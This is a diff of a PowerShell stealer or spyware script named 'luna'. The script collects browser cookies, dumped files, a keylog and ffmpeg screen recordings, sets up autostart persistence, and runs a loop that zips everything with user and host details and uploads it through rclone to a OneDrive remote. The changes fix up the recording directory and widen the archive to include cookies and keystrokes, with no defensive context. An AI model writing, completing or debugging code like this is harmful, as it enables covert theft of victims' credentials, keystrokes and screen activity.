@@ -9,7 +9,7 @@ $logPath = "$tempDir\log.json"
 $keylogPath = "$tempDir\keylog.txt"
 $recordingDir = "$env:USERPROFILE\luna_video_fragments"
 
-New-Item -ItemType Directory -Force -Path $tempDir, $cookieDir, $fileDumpDir | Out-Null
+New-Item -ItemType Directory -Force -Path $tempDir, $cookieDir, $fileDumpDir, $recordingDir, $videoSubDir, | Out-Null
 
 
 Start-Transcript -Path "$tempDir\session.log" -Append
@@ -74,12 +74,12 @@ function Start-Recording {
         return
     }
 
-    if (!(Test-Path $videoDir)) {
-        New-Item -ItemType Directory -Path $videoDir -Force | Out-Null
+    if (!(Test-Path $recordingDir)) {
+        New-Item -ItemType Directory -Path $recordingDir -Force | Out-Null
     }
 
     $ts = Get-Date -Format "yyyyMMdd_HHmmss"
-    $pattern = "$videoDir\frag_$ts_%03d.mp4"
+    $pattern = "$recordingDir\frag_$ts_%03d.mp4"
 
     try {
         Start-Process -FilePath $ffmpeg -ArgumentList @(
@@ -139,7 +139,7 @@ function Archive-And-Report {
 
     $timestamp = Get-Date -Format "yyyyMMdd_HHmmss"
     $user = $env:USERNAME
-    $videoDir = "$env:USERPROFILE\luna_video_fragments"
+    $recordingDir = "$env:USERPROFILE\luna_video_fragments"
     $zipPath = "$env:USERPROFILE\luna_${user}_$timestamp.zip"
     $meta = "$tempDir\info.txt"
     $report = @{ user = $user; host = $env:COMPUTERNAME; timestamp = $timestamp }
@@ -158,21 +158,26 @@ function Archive-And-Report {
             $pathsToArchive += Get-ChildItem $fileDumpDir -Recurse -File -ErrorAction SilentlyContinue
         }
 
-        if (Test-Path $videoDir) {
-            Get-ChildItem $videoDir -Filter *.mp4 -File -ErrorAction SilentlyContinue | ForEach-Object {
+        if (Test-Path $recordingDir) {
+            Get-ChildItem $recordingDir -Filter *.mp4 -File -ErrorAction SilentlyContinue | ForEach-Object {
                 $targetPath = "$videoSubDir\$($_.Name)"
                 Copy-Item $_.FullName $targetPath -Force -ErrorAction SilentlyContinue
                 $pathsToArchive += $targetPath
             }
         }
-
+        
+        $pathsToArchive = @(
+            "$cookieDir\*",
+            "$fileDumpDir\*",
+            "$videoSubDir\*",
+            $logPath, $meta, $keylogPath
+        )
         if ($pathsToArchive.Count -eq 0) {
             Write-Warning "Nothing to archive - skipping archive/report"
             return
         }
 
         Compress-Archive -Path $pathsToArchive -DestinationPath $zipPath -Force
-
         & "$PSScriptRoot\rclone.exe" copy "$zipPath" "onedrive:luna_uploads/$user/$timestamp/" --config "$PSScriptRoot\rclone.conf" --quiet
 
         if ($LASTEXITCODE -ne 0) {
@@ -229,7 +234,9 @@ while ($true) {
     Ensure-Autostart
     Start-Sleep -Seconds 300
     Archive-And-Report
-    Cleanup
+    if (Test-Path $zipPath) {
+        Cleanup
+    }
     Start-Sleep -Seconds 60
 }
 
